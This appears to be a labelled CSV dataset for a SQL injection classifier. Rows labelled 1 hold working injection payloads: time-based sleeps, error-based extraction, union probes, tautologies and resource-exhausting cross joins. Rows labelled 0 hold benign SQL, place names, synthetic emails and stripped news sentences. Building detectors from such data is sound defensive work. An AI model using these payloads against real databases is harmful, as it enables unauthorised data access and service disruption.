Query,Label
"1"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and ""cxsu"" like ""cxsu",1
"-8021"" )  union all select 1166,1166,1166,1166--",1
The letter extends offer cooperate German authorities &quot; difficulties humanitarian situation resolved,0
SELECT TOP 50 PERCENT * FROM element,0
FROM  ( SELECT DISTINCT dull FROM basic ),0
1'   )    )    as zffq where 9572  =  9572 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,1
miravete de la sierra,0
muriel de la fuente,0
"Now New Express undergo &quot; full rectification , &quot; regulator said",0
denice,0
casas de san galindo,0
bahabn de esgueva,0
"select * from users where id  =  1 or "";@"" or 1  =  1 -- 1",1
portomarn,0
zendo,0
"SELECT Shippers.ShipperName, COUNT ( Orders.OrderID )  AS NumberOfOrders FROM    OrdersLEFT JOIN Shippers ON Orders.ShipperID  =  Shippers.ShipperID  GROUP BY ShipperName;",0
0andiar,0
sigut,0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   'bhlx' like 'bhlx",1
"&quot; I find wonderful America , myth folklore already part education , &quot; said",0
SELECT * FROM salmon WHERE NOT sent = 'bare'  AND NOT saved = 'tin',0
"1  )   as zelk where 1944  =  1944 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
tiza,0
fresno de la vega,0
32425777d,0
enaltecedor,0
aduna,0
1 where 8532 = 8532,1
"-9098'|| ( select 'xodn' from dual where 8202 = 8202 union all select 8202,8202,8202,8202,8202,8202,8202--",1
a06b6,0
4458,0
"1""  )   as qirf where 6200  =  6200   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",1
morneau,0
SELECT AVG ( composition ) FROM join SELECT SUM ( will ),0
"1'+ ( select pxrg where 5589 = 5589 or 5356 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
1   )    )    and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   5281  =  5281,1
"Two sets lights close one another: intentional silly error ? Yesterday , Gutacht &apos;s Mayor gave clear answer question",0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28074 )  ORDER BY meta_id ASC",0
1%' and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and '%' = ',1
ericsson,0
"SELECT column_name ( s )  FROM magnet,cannot",0
"1%' )  and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
drane,0
SELECT * FROM machinery 3 SELECT * FROM pocket,0
5988,0
SELECT * FROM  ( SELECT wing FROM leader ),0
"select * from users where id  =  1 or @#""{  =  1 union select 1,version  (    )   -- 1",1
1' and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and 'toxr' like 'toxr,1
"Meanwhile , U",0
-3083  )   or 5221  =  7829,1
SELECT * FROM valuable ORDER BY yellow DESC,0
frankfather@andrestabernero.dj,0
pettingill@demasiado.com.bv,0
29491,0
"-7240'  )  )   union all select 8064,8064,8064#",1
"1%""  )  )   )  and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and   (  (   ( ""%"" = """,1
"1""   )    )    as tpeh where 6306  =  6306 and 5965  =  5806#",1
"1 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  # zcyc",1
lavat@ajuntamentbarcelona20.gy,0
ayen,0
digenova,0
15124,0
Moore added uncovers sufficient evidence warrant criminal civil rights investigation death Johnson ask FBI conduct,0
buchel-alymer@gemas.org.bu,0
1'  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'lnte'  =  'lnte,1
gines,0
"1  )  )   and elt ( 4249 = 4249,7259 )  and   (  (  5683 = 5683",1
59137152n,0
santa mara de las hoyas,0
1 )  as vqdh where 1603 = 1603,1
SELECT TOP 3 * FROM safety,0
"1 and elt  (  1210  =  1210,sleep  (  5   )    )",1
"-7258 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
poemtico,0
SELECT forgotten ( s )  FROM better FULL OUTER JOIN,0
"In country , African-American Hispanic girls tend reach puberty earlier white counterparts",0
"1%"" and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1
hi' )  or  ( 'a' = 'a,1
"1"" or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""jtgs"" like ""jtgs",1
"1'  )   where 4750  =  4750 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1
1  )  )   as prxq where 4600 = 4600,1
"c/ francisco javier simonet 7, 11?e",0
"1'  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  'fnjm'  =  'fnjm",1
50373,0
They read time streams,0
SELECT * FROM gray,0
23522946h,0
SELECT * FROM scientific WHERE stage LIKE '%happy%',0
SELECT * FROM ran,0
SELECT COUNT ( divideID ) FROM asleep,0
"1%' )  or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and  ( '%' = '",1
ne-regio,0
ceremonitica,0
"select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  (  ""swec"" like ""swec",1
7613,0
3702,0
"1%'  )  )   )  union all select null,null,null,null,null,null,null,null,null,null--",1
-9841 where 4612 = 4612 union all select 4612--,1
1901048287713824,0
1'+  (  select 'xbyn' where 6881  =  6881,1
"1  )  )   as juoe where 9994 = 9994 or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
SELECT slipped ( s )  FROM dawn LEFT JOIN,0
45810,0
512155000000000,0
The post hardly ever emptied Sundays &quot; Many citizens yet noticed red dots indicating Sunday post collection still found many post boxes town centre districts,0
1  )   where 3381  =  3381,1
"1', ( select  ( case when  ( 5433 = 5433 )  then 1 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual )",1
select   (  case when   (  9556  =  7122  )   then 9556 else 9556*  (  select 9556 from information_schema.character_sets  )   end  )  #,1
"-1593' or elt  (  7044  =  6125,6125  )   and 'zkuz'  =  'zkuz",1
"select * from users where id  =  1 or ""  (  #"" or 1  =  1 -- 1",1
1 )  where 1402 = 1402,1
SELECT * FROM necessary WHERE due BETWEEN thee09/01/1996window AND led15/31/1996stone,0
coppin@sexl.no,0
65281809n,0
SELECT TOP 3 * FROM be,0
ag77avacin,0
8288603955421514,0
SELECT tears FROM people UNION SELECT aware FROM directly ORDER BY settle,0
1 where 5080  =  5080,1
SELECT smallest ( s )  FROM key UNION ALL,0
SELECT COUNT ( DISTINCT breathe )  FROM turn,0
SELECT pass FROM rise,0
1  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1
"-9356 or elt ( 1032 = 1032,3623 ) -- izgi",1
SELECT feet ( s )  FROM contain SELECT swimming FROM topic,0
"1"" where 1115 = 1115 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
2o0eri23,0
FROM  ( SELECT DISTINCT famous FROM there ),0
SELECT AVG ( Price ) FROM operation,0
SELECT * FROM  ( SELECT particles FROM mission ),0
create user name identified by 'pass123',1
ilise2,0
"select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5-- mkoo",1
0589864781053341,0
"1"" )  or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and  ( ""oyfk"" = ""oyfk",1
32633,0
"-1370'   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  'xmrg'  =  'xmrg",1
"1' )  procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )  and  ( 'qdhz' = 'qdhz",1
"-6067'+ ( select 'bfhf' where 3114 = 3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",1
13107,0
"torre de esteban hambrn, la",0
SELECT * FROM piece WHERE twelve = 'ship'  AND City = 'excellent',0
The projects planned start 2028 2034,0
"1'  )  )   as wves where 2641 = 2641 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153  )  )  #",1
SELECT * FROM language WHERE circus NOT LIKE '[declared]%',0
r8mio34,0
pedro carabia 195,0
lorraine,0
"-4686""  )   as dxks where 7123  =  7123 or elt  (  1032  =  1032,3623  )  --",1
thayra,0
"1%""  )  )   union all select null,null,null,null,null,null,null--",1
"SELECT * FROM given WHERE good IN  ( 'halfway', 'enemy', 'driven' )",0
-9024  )   where 1686  =  1686 or 3069  =  8213--,1
80819303v,0
de78e24423n6e,0
0893945403405745,0
1818801431707826,0
select   (  case when   (  1039  =  5127  )   then 1039 else 1039*  (  select 1039 from information_schema.character_sets  )   end  )  #,1
"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'xhez' like 'xhez",1
proscribir,0
"SELECT * FROM Customers  WHERE Country IN  ( 'Germany', 'France', 'UK' ) ;",0
"1' or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and 'ugum' like 'ugum",1
"1' where 2162 = 2162 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75  )  )    )  )   ) ,1 ) #",1
"1"" )  and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
SELECT AVG ( bill )  FROM either  SELECT SUM ( environment ),0
SELECT COUNT ( imagine ) FROM begun,0
ten.tar,0
"1'+ ( select 'suzs' where 2905 = 2905 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )    )  )  +'",1
"1'   )    )    or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
1'  )  )   )  rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and   (  (   ( 'uzmy' like 'uzmy,1
1'+ ( select ankx where 6789 = 6789,1
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   ""qkat""  =  ""qkat",1
"SELECT * FROM plastic WHERE rich BETWEEN ""low"" AND    ""aloud""",0
sadoc,0
odiln,0
50529,0
SELECT AVG ( grabbed ) FROM lucky,0
"The terror scares us self-trust consistency; reverence past act word, eyes others data computing orbit past acts, loath disappoint them",0
SELECT * FROM farm WHERE split NOT BETWEEN 'settlers' AND 'flat',0
0131468635735450,0
mikel,0
boony,0
ironside9@truecatucasa.bi,0
"peral, 180 4-b",0
"ciri, 23, 5?a",0
97649797p,0
p81i4uer3o,0
desafinar,0
SELECT unit FROM meet UNION SELECT notice FROM including ORDER BY specific,0
4341,0
"1'|| ( select 'yags' where 6268 = 6268 and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  )  ||'",1
"once paradas, 139",0
crioja,0
"Due low level sunshine , autumn spring village Rjukan Vestfjord valley normally languishes shadows surrounding mountains",0
SELECT COUNT ( DISTINCT rear )  FROM strike,0
SELECT * FROM ground WHERE origin NOT LIKE '[exciting]%',0
hallenbe,0
1 )  where 2930 = 2930,1
"A cost calculation performed team professionals , submitted Town Council , make decision determine ongoing procedure",0
"select * from users where id = 1 or "" ) ,"" or 1 = 1 -- 1",1
"-5243"" where 2105 = 2105 or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) --",1
"To believe thought, believe true private heart true men, — genius",0
mayor,0
end and   (  (  'zeyr' = 'zeyr,1
"&quot; Germany &apos;s most-loved ham , &quot; said Jumbo , presenting Black Forest ham",0
SELECT * FROM shorter FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM cast,0
The Civil Aviation Safety Authority also said looking announcement emphasised restrictions use electronic devices critical phases flight still place Australia,0
1%'   )    )     )   rlike sleep  (  5  )  #,1
"-9011""   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
"SELECT * FROM wherever ORDER BY consonant ASC, within DESC",0
santibez el bajo,0
f36hu1a,0
"1' where 4880 = 4880 and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) --",1
5368,0
15198367j,0
kellogg@viajesinternacionales.ne,0
SELECT * FROM adjective WHERE larger IN  ( SELECT tried FROM pond ),0
59041581y,0
SELECT * FROM eleven WHERE night = 'who' LIMIT 3,0
"catalanes, 137, 3?a",0
SELECT pine ( s )  FROM minerals SELECT library ( s ),0
"-7499%""  )   union all select 1893,1893,1893,1893,1893#",1
66837882c,0
SELECT * FROM total WHERE during BETWEEN 'scared' AND 'faster',0
poveda,0
31414,0
balulde,0
"1""  )  )   )  or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and   (  (   ( ""nrhz"" like ""nrhz",1
SELECT * FROM write FETCH FIRST 3 ROWS ONLY,0
23 OR 1  =  1,1
floor@aebo.af,0
2el6s,0
"-3137'|| ( select 'btif' where 1718 = 1718 union all select 1718,1718,1718,1718,1718,1718,1718,1718,1718#",1
"1'  )  )   and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (  'yzdp' = 'yzdp",1
"-7737'|| ( select 'xalo' where 9219 = 9219 union all select 9219,9219,9219,9219#",1
siomara,0
"1"" procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and ""acbq"" like ""acbq",1
carlie,0
admin' or 1 = 1,1
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c82a3dbb22' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
"1  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )",1
c95cinaci7n,0
"Following Mr Chen &apos;s apology , New Express issued front-page apology , saying failed properly check reports",0
2812,0
"The dispute comes plane makers vie sell ever-larger versions twin-engined long-distance aircraft , potentially record orders expected November 17-21 event",0
7stambrar,0
8417339999999999,0
1  )  )   as bsvo where 3605 = 3605,1
select sleep ( 5 )  and   (  (  'srfc' like 'srfc,1
symington@portaldesign.md,0
-4892%'  )  )   or 2251 = 9881--,1
mong-tse,0
"virgen del mayor dolor 188, 11?a",0
rube,0
1%' or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   and '%' = ',1
"admin""or 1  =  1 or """"  =  """,1
1 where 3354  =  3354,1
"1%""   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""%""  =  """,1
"UPDATE bag SET pet =  'consonant', City =  'another' WHERE outer =  title",0
"carrer peru 128, 9?f",0
7291605361624408,0
62573420b,0
SELECT * FROM ranch WHERE adult NOT BETWEEN 'pure' AND 'chamber',0
"All four suspects watched police time part major investigation heroin cocaine racket operating across Lancashire , Cumbria , Merseyside , Berkshire West Yorkshire",0
pangborne@europop.mw,0
"-4541""  )  )   or make_set ( 4821 = 5233,5233 )  and   (  (  ""xfex"" = ""xfex",1
8623,0
SELECT * FROM football WHERE shaking = 'sport'  OR clothing = 'oil',0
SELECT * FROM rubbed,0
"1'|| ( select 'kbvq' where 9279 = 9279 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )   ) ||'",1
"1"" )  as tnux where 4888 = 4888 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) vwyq ) #",1
SELECT * FROM cowboy 3,0
"1%""  )  )   )  or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (   ( ""%"" = """,1
